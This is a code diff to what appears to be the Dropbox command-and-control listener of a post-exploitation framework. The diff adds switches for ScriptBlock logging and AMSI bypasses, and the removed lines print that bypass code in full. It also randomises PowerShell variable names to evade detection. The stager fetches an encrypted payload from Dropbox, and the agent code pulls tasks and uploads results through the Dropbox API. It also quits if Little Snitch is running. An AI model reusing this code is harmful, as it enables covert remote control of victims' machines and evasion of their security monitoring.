@@ -159,7 +159,7 @@ class Listener:
         return True
 
 
-    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
+    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None, scriptLogBypass=True, AMSIBypass=True, AMSIBypass2=False):
         """
         Generate a basic launcher for the specified listener.
         """
@@ -190,39 +190,19 @@ class Listener:
                 stager = '$ErrorActionPreference = \"SilentlyContinue\";'
                 if safeChecks.lower() == 'true':
                     stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
-
                     # ScriptBlock Logging bypass
-                    stager += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
-                    stager += "'System.Management.Automation.Utils'"
-                    stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
-                    stager += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(");If($GPF){$GPC=$GPF.GetValue($null);If($GPC")
-                    stager += "['ScriptB'+'lockLogging']"
-                    stager += helpers.randomize_capitalization("){$GPC")
-                    stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
-                    stager += helpers.randomize_capitalization("$GPC")
-                    stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
-                    stager += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
-                    stager += "('EnableScriptB'+'lockLogging',0);"
-                    stager += helpers.randomize_capitalization("$val.Add")
-                    stager += "('EnableScriptBlockInvocationLogging',0);"
-                    stager += helpers.randomize_capitalization("$GPC")
-                    stager += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
-                    stager += helpers.randomize_capitalization("=$val}")
-                    stager += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
-                    stager += "'signatures','N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
-
+                    if scriptLogBypass:
+                        stager += bypasses.scriptBlockLogBypass()
                     # @mattifestation's AMSI bypass
-                    stager += helpers.randomize_capitalization("[Ref].Assembly.GetType(")
-                    stager += "'System.Management.Automation.AmsiUtils'"
-                    stager += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
-                    stager += "'amsiInitFailed','NonPublic,Static'"
-                    stager += helpers.randomize_capitalization(").SetValue($null,$true)};")
+                    if AMSIBypass:
+                        stager += bypasses.AMSIBypass()
+                    # rastamouse AMSI bypass
+                    if AMSIBypass2:
+                        stager += bypasses.AMSIBypass2()
                     stager += "};"
                     stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
 
-                stager += helpers.randomize_capitalization("$wc=New-Object System.Net.WebClient;")
+                stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+"=New-Object System.Net.WebClient;")
 
                 if userAgent.lower() == 'default':
                     profile = listenerOptions['DefaultProfile']['Value']
@@ -232,19 +212,19 @@ class Listener:
                 if userAgent.lower() != 'none' or proxy.lower() != 'none':
 
                     if userAgent.lower() != 'none':
-                        stager += helpers.randomize_capitalization('$wc.Headers.Add(')
+                        stager += helpers.randomize_capitalization('$'+helpers.generate_random_script_var_name("wc")+'.Headers.Add(')
                         stager += "'User-Agent',$u);"
 
                     if proxy.lower() != 'none':
                         if proxy.lower() == 'default':
-                            stager += helpers.randomize_capitalization("$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
+                            stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
                         else:
                             # TODO: implement form for other proxy
                             stager += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy;")
                             stager += helpers.randomize_capitalization("$proxy.Address = '"+ proxy.lower() +"';")
-                            stager += helpers.randomize_capitalization("$wc.Proxy = $proxy;")
+                            stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Proxy = $proxy;")
                         if proxyCreds.lower() == "default":
-                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
+                            stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
                         else:
                             # TODO: implement form for other proxy credentials
                             username = proxyCreds.split(':')[0]
@@ -252,10 +232,10 @@ class Listener:
                             domain = username.split('\\')[0]
                             usr = username.split('\\')[1]
                             stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
-                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")
+                            stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Proxy.Credentials = $netcred;")
 
                         #save the proxy settings to use during the entire staging process and the agent
-                        stager += "$Script:Proxy = $wc.Proxy;"
+                        stager += "$Script:Proxy = $"+helpers.generate_random_script_var_name("wc")+".Proxy;"
 
                 # TODO: reimplement stager retries?
 
@@ -268,12 +248,12 @@ class Listener:
 
                 # add in the Dropbox auth token and API params
                 stager += "$t='%s';" % (apiToken)
-                stager += helpers.randomize_capitalization("$wc.Headers.Add(")
+                stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Headers.Add(")
                 stager += "\"Authorization\",\"Bearer $t\");"
-                stager += helpers.randomize_capitalization("$wc.Headers.Add(")
+                stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Headers.Add(")
                 stager += "\"Dropbox-API-Arg\",'{\"path\":\"%s/debugps\"}');" % (stagingFolder)
 
-                stager += helpers.randomize_capitalization("$data=$WC.DownloadData('")
+                stager += helpers.randomize_capitalization("$data=$"+helpers.generate_random_script_var_name("wc")+".DownloadData('")
                 stager += "https://content.dropboxapi.com/2/files/download');"
                 stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")
 
@@ -298,9 +278,8 @@ class Listener:
                     if safeChecks.lower() == 'true':
                         launcherBase += "import re, subprocess;"
                         launcherBase += "cmd = \"ps -ef | grep Little\ Snitch | grep -v grep\"\n"
-                        launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n"
-                        launcherBase += "out = ps.stdout.read()\n"
-                        launcherBase += "ps.stdout.close()\n"
+                        launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n"
+                        launcherBase += "out, err = ps.communicate()\n"
                         launcherBase += "if re.search(\"Little Snitch\", out):\n"
                         launcherBase += "   sys.exit()\n"
                 except Exception as e:
@@ -560,28 +539,28 @@ class Listener:
     $script:GetTask = {
         try {
             # build the web request object
-            $wc = New-Object System.Net.WebClient
+            $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient
 
             # set the proxy settings for the WC to be the default system settings
-            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+            $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+            $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
             if($Script:Proxy) {
-                $wc.Proxy = $Script:Proxy;
+                $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
             }
 
-            $wc.Headers.Add("User-Agent", $script:UserAgent)
-            $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}
+            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent", $script:UserAgent)
+            $Script:Headers.GetEnumerator() | ForEach-Object {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
 
             $TaskingsFolder = "%s"
-            $wc.Headers.Set("Authorization", "Bearer $($Script:APIToken)")
-            $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"$TaskingsFolder/$($script:SessionID).txt`"}")
-            $Data = $wc.DownloadData("https://content.dropboxapi.com/2/files/download")
+            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Set("Authorization", "Bearer $($Script:APIToken)")
+            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Set("Dropbox-API-Arg", "{`"path`":`"$TaskingsFolder/$($script:SessionID).txt`"}")
+            $Data = $"""+helpers.generate_random_script_var_name("wc")+""".DownloadData("https://content.dropboxapi.com/2/files/download")
 
             if($Data -and ($Data.Length -ne 0)) {
                 # if there was a tasking data, remove it
-                $wc.Headers.Add("Content-Type", " application/json")
-                $wc.Headers.Remove("Dropbox-API-Arg")
-                $Null=$wc.UploadString("https://api.dropboxapi.com/2/files/delete", "POST", "{`"path`":`"$TaskingsFolder/$($script:SessionID).txt`"}")
+                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("Content-Type", " application/json")
+                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Remove("Dropbox-API-Arg")
+                $Null=$"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://api.dropboxapi.com/2/files/delete", "POST", "{`"path`":`"$TaskingsFolder/$($script:SessionID).txt`"}")
                 $Data
             }
             $script:MissedCheckins = 0
@@ -607,16 +586,16 @@ class Listener:
             $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5
 
             # build the web request object
-            $wc = New-Object System.Net.WebClient
+            $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient
             # set the proxy settings for the WC to be the default system settings
-            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+            $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+            $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
             if($Script:Proxy) {
-                $wc.Proxy = $Script:Proxy;
+                $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
             }
 
-            $wc.Headers.Add('User-Agent', $Script:UserAgent)
-            $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}
+            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('User-Agent', $Script:UserAgent)
+            $Script:Headers.GetEnumerator() | ForEach-Object {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
 
             $ResultsFolder = "%s"
 
@@ -625,9 +604,9 @@ class Listener:
                 #   download the file and append the new routing packet to it
                 try {
                     $Data = $Null
-                    $wc.Headers.Set("Authorization", "Bearer $($Script:APIToken)");
-                    $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}");
-                    $Data = $wc.DownloadData("https://content.dropboxapi.com/2/files/download")
+                    $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Set("Authorization", "Bearer $($Script:APIToken)");
+                    $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Set("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}");
+                    $Data = $"""+helpers.generate_random_script_var_name("wc")+""".DownloadData("https://content.dropboxapi.com/2/files/download")
                 }
                 catch { }
 
@@ -635,17 +614,17 @@ class Listener:
                     $RoutingPacket = $Data + $RoutingPacket
                 }
 
-                $wc2 = New-Object System.Net.WebClient
-                $wc2.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-                $wc2.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+                $"""+helpers.generate_random_script_var_name("wc")+"""2 = New-Object System.Net.WebClient
+                $"""+helpers.generate_random_script_var_name("wc")+"""2.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+                $"""+helpers.generate_random_script_var_name("wc")+"""2.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                 if($Script:Proxy) {
-                    $wc2.Proxy = $Script:Proxy;
+                    $"""+helpers.generate_random_script_var_name("wc")+"""2.Proxy = $Script:Proxy;
                 }
 
-                $wc2.Headers.Add("Authorization", "Bearer $($Script:APIToken)")
-                $wc2.Headers.Add("Content-Type", "application/octet-stream")
-                $wc2.Headers.Add("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}");
-                $Null = $wc2.UploadData("https://content.dropboxapi.com/2/files/upload", "POST", $RoutingPacket)
+                $"""+helpers.generate_random_script_var_name("wc")+"""2.Headers.Add("Authorization", "Bearer $($Script:APIToken)")
+                $"""+helpers.generate_random_script_var_name("wc")+"""2.Headers.Add("Content-Type", "application/octet-stream")
+                $"""+helpers.generate_random_script_var_name("wc")+"""2.Headers.Add("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}");
+                $Null = $"""+helpers.generate_random_script_var_name("wc")+"""2.UploadData("https://content.dropboxapi.com/2/files/upload", "POST", $RoutingPacket)
                 $script:MissedCheckins = 0
             }
             catch {
